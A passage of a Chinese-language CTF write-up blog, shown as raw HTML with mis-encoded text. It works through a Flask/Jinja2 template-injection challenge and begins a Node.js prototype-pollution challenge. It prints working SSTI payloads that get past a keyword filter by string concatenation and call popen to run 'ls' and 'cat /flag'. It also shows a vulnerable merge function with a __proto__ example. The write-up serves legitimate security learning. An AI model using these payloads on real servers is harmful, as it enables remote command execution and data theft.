class="hljs-name">div</span>&gt;</span></span><span class="language-xml"></span><br><span class="language-xml">    <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span></span><span class="language-xml"></span><br><span class="language-xml">  <span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span></span><span class="language-xml"></span><br><span class="language-xml"><span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span></span><br><br>&lt;!--<br><br>Traceback (most recent call<span class="hljs-built_in"> last</span>):<br>  File <span class="hljs-string">&quot;/usr/local/lib/python3.8/site-packages/flask/app.py&quot;</span>, line <span class="hljs-number">2213</span>, <span class="hljs-keyword">in</span> __call_<span class="hljs-number">_</span><br>    <span class="hljs-keyword">return</span> self.wsgi_app(environ, start_response)<br>  File <span class="hljs-string">&quot;/usr/local/lib/python3.8/site-packages/flask/app.py&quot;</span>, line <span class="hljs-number">2193</span>, <span class="hljs-keyword">in</span> wsgi_app<br>    response = self.handle_exception(e)<br>  File <span class="hljs-string">&quot;/usr/local/lib/python3.8/site-packages/flask/app.py&quot;</span>, line <span class="hljs-number">2190</span>, <span class="hljs-keyword">in</span> wsgi_app<br>    response = self.full_dispatch_request()<br>  File <span class="hljs-string">&quot;/usr/local/lib/python3.8/site-packages/flask/app.py&quot;</span>, line <span class="hljs-number">1486</span>, <span class="hljs-keyword">in</span> full_dispatch_request<br>    rv = self.handle_user_exception(e)<br>  File <span class="hljs-string">&quot;/usr/local/lib/python3.8/site-packages/flask/app.py&quot;</span>, line <span class="hljs-number">1484</span>, <span class="hljs-keyword">in</span> full_dispatch_request<br>    rv = self.dispatch_request()<br>  File <span class="hljs-string">&quot;/usr/local/lib/python3.8/site-packages/flask/app.py&quot;</span>, line <span class="hljs-number">1469</span>, <span class="hljs-keyword">in</span> dispatch_request<br>    <span class="hljs-keyword">return</span> self.ensure_sync(self.view_functions[rule.endpoint])(**view_args)<br>  File <span class="hljs-string">&quot;/app/app.py&quot;</span>, line <span class="hljs-number">21</span>, <span class="hljs-keyword">in</span> hello<br>    <span class="hljs-keyword">return</span> render_template_string(sign_in)<br>  File <span class="hljs-string">&quot;/usr/local/lib/python3.8/site-packages/flask/templating.py&quot;</span>, line <span class="hljs-number">162</span>, <span class="hljs-keyword">in</span> render_template_string<br>    template = app.jinja_env.from_string(source)<br>  File <span class="hljs-string">&quot;/usr/local/lib/python3.8/site-packages/jinja2/environment.py&quot;</span>, line <span class="hljs-number">1105</span>, <span class="hljs-keyword">in</span> from_string<br>    <span class="hljs-keyword">return</span> cls.from_code(self, self.compile(source), gs, None)<br>  File <span class="hljs-string">&quot;/usr/local/lib/python3.8/site-packages/jinja2/environment.py&quot;</span>, line <span class="hljs-number">768</span>, <span class="hljs-keyword">in</span> compile<br>    self.handle_exception(source=source_hint)<br>  File <span class="hljs-string">&quot;/usr/local/lib/python3.8/site-packages/jinja2/environment.py&quot;</span>, line <span class="hljs-number">936</span>, <span class="hljs-keyword">in</span> handle_exception<br>    raise rewrite_traceback_stack(source=source)<br>  File <span class="hljs-string">&quot;&lt;unknown&gt;&quot;</span>, line <span class="hljs-number">2</span>, <span class="hljs-keyword">in</span> template<br>jinja2.exceptions.TemplateSyntaxError: tag<span class="hljs-built_in"> name</span> expected<br><br><br>--&gt;<br></code></pre></td></tr></table></figure><p>ä¸€å¼€å§‹æƒ³äº†æŒºä¹…ä¸çŸ¥é“ä¸ºå•¥å‡ºè¿™ä¸ªé¡µé¢ï¼Œåé¢æ³¨æ„åˆ°è¿™é‡Œé¢æœ‰ä¸ª<code>Debug</code>ï¼Œå¾ˆæ˜æ˜¾æ˜¯æˆ‘ä»¬çš„è¾“å…¥æœ‰é—®é¢˜ï¼Œå°è¯•è®¿é—®ï¼š<code>/secr3tofpop?name=&#123;%%20print([].__class__.__base__.__subclasses__()[%22`å°±æ˜¯åŠ å·ä¹‹å‰çš„é‚£éƒ¨åˆ†ï¼Œæœç„¶è¿›å…¥äº†`Debug`ç•Œé¢ï¼š![genshin9](img/genshin9.png)`payload`ä¸­çš„`+`è¢«æ›¿æ¢æˆç©ºæ ¼äº†ï¼š`/secr3tofpop?name=++1++`![genshin10](img/genshin10.png)![genshin11](img/genshin11.png)è¿™é‡Œå¯ä»¥æ‰¾åˆ°éƒ¨åˆ†å’Œ`waf`æœ‰å…³çš„ä»£ç ï¼Œä½†`waf`å…·ä½“æ˜¯ä»€ä¹ˆä¸çŸ¥é“ã€‚å…¶å®åœ¨`%7b%%20print([].__class__.__base__.__subclasses__())%20%%7D`ç•Œé¢æ˜¯èƒ½æœç´¢åˆ°å¸¦æœ‰`os`çš„æ¨¡å—çš„ï¼Œæ€»ä¸èƒ½è®©æˆ‘ä¸€ä¸ªä¸€ä¸ªå»æ•°å§ã€‚ã€‚æƒ³äº†æƒ³å†™å‡ºä¸ªè¿™ä¸ªä¸œè¥¿ï¼š<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> re<br><br>a = <span class="hljs-string">&quot;&lt;class &#x27;type&#x27;&gt;, &lt;class &#x27;weakref&#x27;&gt;, &lt;class &#x27;weakcallableproxy&#x27;&gt;, &lt;class &#x27;weakproxy&#x27;&gt;, &lt;class &#x27;int&#x27;&gt;, &lt;class &#x27;bytearray&#x27;&gt;, &lt;class &#x27;bytes&#x27;&gt;, &lt;class &#x27;list&#x27;&gt;, &lt;class &#x27;NoneType&#x27;&gt;, &lt;class &#x27;NotImplementedType&#x27;&gt;, &lt;class &#x27;traceback&#x27;&gt;, &lt;class &#x27;super&#x27;&gt;, &lt;class &#x27;range&#x27;&gt;, &lt;class &#x27;dict&#x27;&gt;, &lt;class &#x27;dict_keys&#x27;&gt;, &lt;class &#x27;dict_values&#x27;&gt;, &lt;class &#x27;dict_items&#x27;&gt;, &lt;class &#x27;dict_reversekeyiterator&#x27;&gt;, &lt;class &#x27;dict_reversevalueiterator&#x27;&gt;, &lt;class &#x27;dict_reverseitemiterator&#x27;&gt;, &lt;class &#x27;odict_iterator&#x27;&gt;, &lt;class &#x27;set&#x27;&gt;, &lt;class &#x27;str&#x27;&gt;, &lt;class &#x27;slice&#x27;&gt;, &lt;class &#x27;staticmethod&#x27;&gt;, &lt;class &#x27;complex&#x27;&gt;, &lt;class &#x27;float&#x27;&gt;, &lt;class &#x27;frozenset&#x27;&gt;, &lt;class &#x27;property&#x27;&gt;, &lt;class &#x27;managedbuffer&#x27;&gt;, &lt;class &#x27;memoryview&#x27;&gt;, &lt;class &#x27;tuple&#x27;&gt;, &lt;class &#x27;enumerate&#x27;&gt;, &lt;class &#x27;reversed&#x27;&gt;, &lt;class &#x27;stderrprinter&#x27;&gt;, &lt;class &#x27;code&#x27;&gt;, &lt;class &#x27;frame&#x27;&gt;, &lt;class &#x27;builtin_function_or_method&#x27;&gt;, &lt;class &#x27;method&#x27;&gt;, &lt;class &#x27;function&#x27;&gt;, &lt;class &#x27;mappingproxy&#x27;&gt;, &lt;class &#x27;generator&#x27;&gt;, &lt;class &#x27;getset_descriptor&#x27;&gt;, &lt;class &#x27;wrapper_descriptor&#x27;&gt;, &lt;class &#x27;method-wrapper&#x27;&gt;, &lt;class &#x27;ellipsis&#x27;&gt;, &lt;class &#x27;member_descriptor&#x27;&gt;, &lt;class &#x27;types.SimpleNamespace&#x27;&gt;, &lt;class &#x27;PyCapsule&#x27;&gt;, &lt;class &#x27;longrange_iterator&#x27;&gt;, &lt;class &#x27;cell&#x27;&gt;, &lt;class &#x27;instancemethod&#x27;&gt;, &lt;class &#x27;classmethod_descriptor&#x27;&gt;, &lt;class &#x27;method_descriptor&#x27;&gt;, &lt;class &#x27;callable_iterator&#x27;&gt;, &lt;class &#x27;iterator&#x27;&gt;, &lt;class &#x27;pickle.PickleBuffer&#x27;&gt;, &lt;class &#x27;coroutine&#x27;&gt;, &lt;class &#x27;coroutine_wrapper&#x27;&gt;, &lt;class &#x27;InterpreterID&#x27;&gt;, &lt;class &#x27;EncodingMap&#x27;&gt;, &lt;class &#x27;fieldnameiterator&#x27;&gt;, &lt;class &#x27;formatteriterator&#x27;&gt;, &lt;class &#x27;BaseException&#x27;&gt;, &lt;class &#x27;hamt&#x27;&gt;, &lt;class &#x27;hamt_array_node&#x27;&gt;, &lt;class &#x27;hamt_bitmap_node&#x27;&gt;, &lt;class &#x27;hamt_collision_node&#x27;&gt;, &lt;class &#x27;keys&#x27;&gt;, &lt;class &#x27;values&#x27;&gt;, &lt;class &#x27;items&#x27;&gt;, &lt;class &#x27;Context&#x27;&gt;, &lt;class &#x27;ContextVar&#x27;&gt;, &lt;class &#x27;Token&#x27;&gt;, &lt;class &#x27;Token.MISSING&#x27;&gt;, &lt;class &#x27;moduledef&#x27;&gt;, &lt;class &#x27;module&#x27;&gt;, &lt;class &#x27;filter&#x27;&gt;, &lt;class &#x27;map&#x27;&gt;, &lt;class &#x27;zip&#x27;&gt;, &lt;class &#x27;_frozen_importlib._ModuleLock&#x27;&gt;, &lt;class &#x27;_frozen_importlib._DummyModuleLock&#x27;&gt;, &lt;class &#x27;_frozen_importlib._ModuleLockManager&#x27;&gt;, &lt;class &#x27;_frozen_importlib.ModuleSpec&#x27;&gt;, &lt;class &#x27;_frozen_importlib.BuiltinImporter&#x27;&gt;, &lt;class &#x27;classmethod&#x27;&gt;, &lt;class &#x27;_frozen_importlib.FrozenImporter&#x27;&gt;, &lt;class &#x27;_frozen_importlib._ImportLockContext&#x27;&gt;, &lt;class &#x27;_thread._localdummy&#x27;&gt;, &lt;class &#x27;_thread._local&#x27;&gt;, &lt;class &#x27;_thread.lock&#x27;&gt;, &lt;class &#x27;_thread.RLock&#x27;&gt;, &lt;class &#x27;_io._IOBase&#x27;&gt;, &lt;class &#x27;_io._BytesIOBuffer&#x27;&gt;, &lt;class &#x27;_io.IncrementalNewlineDecoder&#x27;&gt;, &lt;class &#x27;posix.ScandirIterator&#x27;&gt;, &lt;class &#x27;posix.DirEntry&#x27;&gt;, &lt;class &#x27;_frozen_importlib_external.WindowsRegistryFinder&#x27;&gt;, &lt;class &#x27;_frozen_importlib_external._LoaderBasics&#x27;&gt;, &lt;class &#x27;_frozen_importlib_external.FileLoader&#x27;&gt;, &lt;class &#x27;_frozen_importlib_external._NamespacePath&#x27;&gt;, &lt;class &#x27;_frozen_importlib_external._NamespaceLoader&#x27;&gt;, &lt;class &#x27;_frozen_importlib_external.PathFinder&#x27;&gt;, &lt;class &#x27;_frozen_importlib_external.FileFinder&#x27;&gt;, &lt;class &#x27;zipimport.zipimporter&#x27;&gt;, &lt;class &#x27;zipimport._ZipImportResourceReader&#x27;&gt;, &lt;class &#x27;codecs.Codec&#x27;&gt;, &lt;class &#x27;codecs.IncrementalEncoder&#x27;&gt;, &lt;class &#x27;codecs.IncrementalDecoder&#x27;&gt;, &lt;class &#x27;codecs.StreamReaderWriter&#x27;&gt;, &lt;class &#x27;codecs.StreamRecoder&#x27;&gt;, &lt;class &#x27;_abc_data&#x27;&gt;, &lt;class &#x27;abc.ABC&#x27;&gt;, &lt;class &#x27;dict_itemiterator&#x27;&gt;, &lt;class &#x27;collections.abc.Hashable&#x27;&gt;, &lt;class &#x27;collections.abc.Awaitable&#x27;&gt;, &lt;class &#x27;collections.abc.AsyncIterable&#x27;&gt;, &lt;class &#x27;async_generator&#x27;&gt;, &lt;class &#x27;collections.abc.Iterable&#x27;&gt;, &lt;class &#x27;bytes_iterator&#x27;&gt;, &lt;class &#x27;bytearray_iterator&#x27;&gt;, &lt;class &#x27;dict_keyiterator&#x27;&gt;, &lt;class &#x27;dict_valueiterator&#x27;&gt;, &lt;class &#x27;list_iterator&#x27;&gt;, &lt;class &#x27;list_reverseiterator&#x27;&gt;, &lt;class &#x27;range_iterator&#x27;&gt;, &lt;class &#x27;set_iterator&#x27;&gt;, &lt;class &#x27;str_iterator&#x27;&gt;, &lt;class &#x27;tuple_iterator&#x27;&gt;, &lt;class &#x27;collections.abc.Sized&#x27;&gt;, &lt;class &#x27;collections.abc.Container&#x27;&gt;, &lt;class &#x27;collections.abc.Callable&#x27;&gt;, &lt;class &#x27;os._wrap_close&#x27;&gt;&quot;</span><br><br><br><span class="hljs-comment"># ä½¿ç”¨æ­£åˆ™è¡¨è¾¾å¼æå–ç±»å</span><br>class_names = re.findall(<span class="hljs-string">r&quot;&lt;class &#x27;([^&#x27;]+)&#x27;&quot;</span>, a)<br><br><span class="hljs-comment"># è¾“å‡ºæ•´ä¸ªæ•°ç»„</span><br><span class="hljs-built_in">print</span>(class_names)<br><br><span class="hljs-comment"># è¾“å‡º&#x27;int&#x27;æ‰€åœ¨çš„ä½ç½®</span><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;int æ‰€åœ¨çš„ä½ç½®:&quot;</span>, class_names.index(<span class="hljs-string">&quot;os._wrap_close&quot;</span>))<br><br><span class="hljs-comment">#132</span><br></code></pre></td></tr></table></figure>å¸¦æœ‰`Printer`å’Œ`Error`çš„æ¨¡å—æ²¡æ‰¾åˆ°ï¼Œå°±å»æ‰¾å¸¦æœ‰`os`çš„äº†ç„¶ååˆ©ç”¨`.__init__.__globals__['os']`å»è®¿é—®`os`è¿™ä¸ªæ¨¡å—ä»¥è°ƒç”¨å‡½æ•°ï¼š`secr3tofpop?name=&#123;%%20print([].__class__.__base__.__subclasses__()[132].__init__.__globals__[%27os%27])%20%&#125;</code></p><p>åˆè§¦å‘äº†è¿‡æ»¤ã€‚ã€‚å°è¯•åå‘ç°<code>init</code>è¿™ä¸œè¥¿ä¸è®©ç”¨(åŒæ—¶è¿‡æ»¤å¤§å°å†™)ï¼Œå‚è€ƒï¼š<code>[SSTIæ¨¡æ¿æ³¨å…¥ç»•è¿‡ï¼ˆè¿›é˜¶ç¯‡ï¼‰_sstiç»•è¿‡-CSDNåšå®¢](https://blog.csdn.net/miuzzx/article/details/110220425)</code></p><p><code>/secr3tofpop?name=&#123;%%20print([].__class__.__base__.__subclasses__()[132])%20%&#125;</code></p><p>è€ƒè™‘ä½¿ç”¨æ‹¼æ¥ç»•è¿‡ï¼š</p><p><code>/secr3tofpop?name=&#123;%%20print([].__class__.__base__.__subclasses__()[132][%22__in%22+%22it__%22][%22__glo%22+%22bals__%22][%22po%22%22pen%22](%22ls%22).read())%20%&#125;</code></p><p><img src="/img/genshin14.png" alt="genshin14"></p><figure class="highlight mel"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mel">/secr3tofpop?name=&#123;%%<span class="hljs-number">20</span><span class="hljs-keyword">print</span>([].__class__.__base__.__subclasses__()[<span class="hljs-number">132</span>][%22__in%22+%22it__%22][%22__glo%22+%22bals__%22][%22po%22%22pen%22](%22cat%20/flag%22).read())%20%&#125;<br></code></pre></td></tr></table></figure><p><img src="/img/genshin13.png" alt="genshin13"></p><p>è¿™é¢˜è§£æ³•ä¸€å¤§å †ï¼Œå…¶å®ƒ<code>payload</code>å¯ä»¥å‚è€ƒï¼š<code>https://www.cnblogs.com/Article-kelp/p/14797393.html#5228271</code></p><h2 id="OtenkiGirl"><a href="#OtenkiGirl" class="headerlink" title="OtenkiGirl"></a>OtenkiGirl</h2><p>æç¤ºï¼šrainâ€¦ spreadâ€¦ polluteâ€¦ï¼Œåˆæ­¥åˆ¤æ–­åŸå‹é“¾æ±¡æŸ“</p><p><img src="/img/otengirl1.png" alt="otengirl1"></p><p>ä¸‹è½½<code>o.zip</code>é™„ä»¶ï¼š</p><p><img src="/img/otengirl2.png" alt="otengirl2"></p><p>ã€‚ã€‚ã€‚ã€‚å¤ªå¤šäº†ï¼Œ<code>hint.txt</code>æ‰“å¼€å‘ç°æ˜¯æ®µæ—¥è¯­ï¼š<code>ã€ã€Œroutesã€ãƒ•ã‚©ãƒ«ãƒ€ãƒ¼ã ã‘ã‚’è¦‹ã¦ãã ã•ã„ã€‚SQLã‚¤ãƒ³ã‚¸ã‚§ã‚¯ã‚·ãƒ§ãƒ³ã¯ã‚ã‚Šã¾ã›ã‚“ã€‚ã€ã¨å¾¡å‚å¾¡å‚ã¯æœŸå¾…ã«æº€ã¡ãŸæ°—æŒã¡ã§è¨€ã£ãŸã€‚</code></p><p>ç¿»è¯‘ï¼š<code>å¾¡å‚å¾¡å‚æ»¡æ€€æœŸå¾…åœ°è¯´é“ï¼šâ€œè¯·åªæŸ¥çœ‹&#39;routes&#39;æ–‡ä»¶å¤¹ã€‚æ²¡æœ‰SQLæ³¨å…¥é—®é¢˜ã€‚</code></p><p>é‚£å°±çœ‹çœ‹<code>routes</code>:</p><p><img src="/img/otengirl4.png" alt="otengirl4"></p><p>é¦–å…ˆæ˜¯<code>info.js</code>:</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">const</span> <span class="hljs-title class_">Router</span> = <span class="hljs-built_in">require</span>(<span class="hljs-string">&quot;koa-router&quot;</span>);<br><span class="hljs-keyword">const</span> router = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Router</span>();<br><span class="hljs-keyword">const</span> <span class="hljs-variable constant_">SQL</span> = <span class="hljs-built_in">require</span>(<span class="hljs-string">&quot;./sql&quot;</span>);<br><span class="hljs-keyword">const</span> sql = <span class="hljs-keyword">new</span> <span class="hljs-title function_">SQL</span>(<span class="hljs-string">&quot;wishes&quot;</span>);<br><span class="hljs-keyword">const</span> <span class="hljs-variable constant_">CONFIG</span> = <span class="hljs-built_in">require</span>(<span class="hljs-string">&quot;../config&quot;</span>)<br><span class="hljs-keyword">const</span> <span class="hljs-variable constant_">DEFAULT_CONFIG</span> = <span class="hljs-built_in">require</span>(<span class="hljs-string">&quot;../config.default&quot;</span>)<br><br><span class="hljs-keyword">async</span> <span class="hljs-keyword">function</span> <span class="hljs-title function_">getInfo</span>(<span class="hljs-params">timestamp</span>) &#123;<span class="hljs-comment">//getInfoå¼‚æ­¥å‡½æ•°</span><br>    timestamp = <span class="hljs-keyword">typeof</span> timestamp === <span class="hljs-string">&quot;number&quot;</span> ? timestamp : <span class="hljs-title class_">Date</span>.<span class="hljs-title function_">now</span>();<span class="hljs-comment">//æ£€æŸ¥ä¼ å…¥çš„timestampå‚æ•°æ˜¯å¦ä¸ºæ•°å­—ç±»å‹ï¼Œå¦‚æœä¸æ˜¯åˆ™å°†å…¶è®¾ç½®ä¸ºå½“å‰æ—¶é—´æˆ³</span><br>    <span class="hljs-comment">// Remove test data from before the movie was released</span><br>    <span class="hljs-keyword">let</span> minTimestamp = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Date</span>(<span class="hljs-variable constant_">CONFIG</span>.<span class="hljs-property">min_public_time</span> || <span class="hljs-variable constant_">DEFAULT_CONFIG</span>.<span class="hljs-property">min_public_time</span>).<span class="hljs-title function_">getTime</span>();<span class="hljs-comment">//å°†min_public_timeè½¬æ¢ä¸ºæ—¶é—´æˆ³ï¼Œä½¿ç”¨åº”ç”¨ç¨‹åºé…ç½®ä¸­çš„æœ€å°å…¬å¼€æ—¶é—´ï¼Œå¦‚æœæ²¡æœ‰é…ç½®ï¼Œåˆ™ä½¿ç”¨é»˜è®¤é…ç½®ä¸­çš„æœ€å°å…¬å¼€æ—¶é—´</span><br>    timestamp = <span class="hljs-title class_">Math</span>.<span class="hljs-title function_">max</span>(timestamp, minTimestamp);<span class="hljs-comment">//ç¡®ä¿timestampä¸ä¼šæ—©äºminTimestamp</span><br>    <span class="hljs-keyword">const</span> data = <span class="hljs-keyword">await</span> sql.<span class="hljs-title function_">all</span>(<span class="hljs-string">`SELECT wishid, date, place, contact, reason, timestamp FROM wishes WHERE timestamp &gt;= ?`</span>, [timestamp]).<span class="hljs-title function_">catch</span>(<span class="hljs-function"><span class="hljs-params">e</span> =&gt;</span> &#123; <span class="hljs-keyword">throw</span> e &#125;);<br>    <span class="hljs-keyword">return</span> data;<br>&#125;<br><br>router.<span class="hljs-title function_">post</span>(<span class="hljs-string">&quot;/info/:ts?&quot;</span>, <span class="hljs-keyword">async</span> (ctx) =&gt; &#123;<br>    <span class="hljs-keyword">if</span> (ctx.<span class="hljs-property">header</span>[<span class="hljs-string">&quot;content-type&quot;</span>] !== <span class="hljs-string">&quot;application/x-www-form-urlencoded&quot;</span>)<br>        <span class="hljs-keyword">return</span> ctx.<span class="hljs-property">body</span> = &#123;<br>            <span class="hljs-attr">status</span>: <span class="hljs-string">&quot;error&quot;</span>,<br>            <span class="hljs-attr">msg</span>: <span class="hljs-string">&quot;Content-Type must be application/x-www-form-urlencoded&quot;</span><br>        &#125;<br>    <span class="hljs-keyword">if</span> (<span class="hljs-keyword">typeof</span> ctx.<span class="hljs-property">params</span>.<span class="hljs-property">ts</span> === <span class="hljs-string">&quot;undefined&quot;</span>) ctx.<span class="hljs-property">params</span>.<span class="hljs-property">ts</span> = <span class="hljs-number">0</span><br>    <span class="hljs-keyword">const</span> timestamp = <span class="hljs-regexp">/^[0-9]+$/</span>.<span class="hljs-title function_">test</span>(ctx.<span class="hljs-property">params</span>.<span class="hljs-property">ts</span> || <span class="hljs-string">&quot;&quot;</span>) ? <span class="hljs-title class_">Number</span>(ctx.<span class="hljs-property">params</span>.<span class="hljs-property">ts</span>) : ctx.<span class="hljs-property">params</span>.<span class="hljs-property">ts</span>;<br>    <span class="hljs-keyword">if</span> (<span class="hljs-keyword">typeof</span> timestamp !== <span class="hljs-string">&quot;number&quot;</span>)<br>        <span class="hljs-keyword">return</span> ctx.<span class="hljs-property">body</span> = &#123;<br>            <span class="hljs-attr">status</span>: <span class="hljs-string">&quot;error&quot;</span>,<br>            <span class="hljs-attr">msg</span>: <span class="hljs-string">&quot;Invalid parameter ts&quot;</span><br>        &#125;<br><br>    <span class="hljs-keyword">try</span> &#123;<br>        <span class="hljs-keyword">const</span> data = <span class="hljs-keyword">await</span> <span class="hljs-title function_">getInfo</span>(timestamp).<span class="hljs-title function_">catch</span>(<span class="hljs-function"><span class="hljs-params">e</span> =&gt;</span> &#123; <span class="hljs-keyword">throw</span> e &#125;);<br>        ctx.<span class="hljs-property">body</span> = &#123;<br>            <span class="hljs-attr">status</span>: <span class="hljs-string">&quot;success&quot;</span>,<br>            <span class="hljs-attr">data</span>: data<br>        &#125;<br>    &#125; <span class="hljs-keyword">catch</span> (e) &#123;<br>        <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">error</span>(e);<br>        <span class="hljs-keyword">return</span> ctx.<span class="hljs-property">body</span> = &#123;<br>            <span class="hljs-attr">status</span>: <span class="hljs-string">&quot;error&quot;</span>,<br>            <span class="hljs-attr">msg</span>: <span class="hljs-string">&quot;Internal Server Error&quot;</span><br>        &#125;<br>    &#125;<br>&#125;)<br><br><span class="hljs-variable language_">module</span>.<span class="hljs-property">exports</span> = router;<br><span class="hljs-comment">//ä¸»è¦å°±æ˜¯getInfoè¿™ä¸ªå‡½æ•°ï¼Œå‰©ä¸‹çš„å°±æ˜¯ä¸€äº›è¿”å›çŠ¶æ€å•¥çš„</span><br></code></pre></td></tr></table></figure><p>æ³¨æ„æ³¨é‡Šï¼š<code>Remove test data from before the movie was released</code>ï¼Œåˆ é™¤ç”µå½±å‘å¸ƒä¹‹å‰çš„æµ‹è¯•æ•°æ®ã€‚é‚£<code>flag</code>åº”è¯¥å’Œç”µå½±å‘å¸ƒæ—¥æœŸä¹‹å‰çš„æŸäº›æ•°æ®æœ‰å…³ã€‚</p><p><code>submit.js</code>(å­˜åœ¨<code>merge</code>å‡½æ•°çš„éƒ¨åˆ†):</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">const</span> <span class="hljs-title function_">merge</span> = (<span class="hljs-params">dst, src</span>) =&gt; &#123;<br>    <span class="hljs-keyword">if</span> (<span class="hljs-keyword">typeof</span> dst !== <span class="hljs-string">&quot;object&quot;</span> || <span class="hljs-keyword">typeof</span> src !== <span class="hljs-string">&quot;object&quot;</span>) <span class="hljs-keyword">return</span> dst;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">let</span> key <span class="hljs-keyword">in</span> src) &#123;<br>        <span class="hljs-keyword">if</span> (key <span class="hljs-keyword">in</span> dst &amp;&amp; key <span class="hljs-keyword">in</span> src) &#123;<br>            dst[key] = <span class="hljs-title function_">merge</span>(dst[key], src[key]);<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            dst[key] = src[key];<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">return</span> dst;<br>&#125;<br><span class="hljs-comment">//ä»¥åŠï¼š</span><br>        <span class="hljs-keyword">const</span> result = <span class="hljs-keyword">await</span> <span class="hljs-title function_">insert2db</span>(<span class="hljs-title function_">merge</span>(<span class="hljs-variable constant_">DEFAULT</span>, data));<span class="hljs-comment">//æ³¨æ„è¿™é‡Œï¼</span><br></code></pre></td></tr></table></figure><p>å…¶å®å¯¹åŸå‹é“¾æ±¡æŸ“è¿™ä¸œè¥¿æœ‰ç‚¹äº†è§£å°±ä¼šçŸ¥é“ï¼šå¯ä»¥é€šè¿‡<strong>å¯¹è±¡merge</strong>æˆ– <strong>å¯¹è±¡clone</strong>æ§åˆ¶<code>å¯¹è±¡.__proto__</code>çš„å€¼ï¼Œé—´æ¥ä¿®æ”¹ç»§æ‰¿è¯¥åŸå‹å¯¹è±¡çš„æ‰€æœ‰å¯¹è±¡ï¼Œä¸¾ä¸ªç®€å•çš„æ —å­ï¼š</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-comment">//ç”¨äºå°†ä¸€ä¸ªæºå¯¹è±¡çš„å±æ€§åˆå¹¶åˆ°ç›®æ ‡å¯¹è±¡ä¸­</span><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">merge</span>(<span class="hljs-params">target, source</span>) &#123;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">let</span> key <span class="hljs-keyword">in</span> source) &#123; <span class="hljs-comment">//éå†sourceçš„æ‰€æœ‰å±æ€§</span><br>        <span class="hljs-keyword">if</span> (key <span class="hljs-keyword">in</span> source &amp;&amp; key <span class="hljs-keyword">in</span> target) &#123;<span class="hljs-comment">//å¯¹äºæ¯ä¸ªå±æ€§ï¼Œè‹¥åŒæ—¶å­˜åœ¨äºæºå¯¹è±¡å’Œç›®æ ‡å¯¹è±¡ä¸­</span><br>            <span class="hljs-title function_">merge</span>(target[key], source[key]) <span class="hljs-comment">//è¡¨ç¤ºè¿™æ˜¯ä¸€ä¸ªåµŒå¥—å¯¹è±¡ï¼Œéœ€è¦é€’å½’è°ƒç”¨mergeå‡½æ•°ï¼Œå°†æºå¯¹è±¡çš„åµŒå¥—å±æ€§åˆå¹¶åˆ°ç›®æ ‡å¯¹è±¡çš„å¯¹åº”åµŒå¥—å±æ€§ä¸­ã€‚</span><br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            target[key] = source[key]<span class="hljs-comment">//éåµŒå¥—å±æ€§ï¼Œç›´æ¥å°†æºå¯¹è±¡çš„å±æ€§å€¼èµ‹ç»™ç›®æ ‡å¯¹è±¡çš„å¯¹åº”å±æ€§ã€‚</span><br>        &#125;<br>    &#125;<br>&#125;<br><span class="hljs-comment">//</span><br><br><span class="hljs-keyword">let</span> o1 = &#123;&#125;<br><span class="hljs-keyword">let</span> o2 = <span class="hljs-title class_">JSON</span>.<span class="hljs-title function_">parse</span>(<span class="hljs-string">&#x27;&#123;&quot;a&quot;: 1, &quot;__proto__&quot;: &#123;&quot;b&quot;: 2&#125;&#125;&#x27;</span>)<span 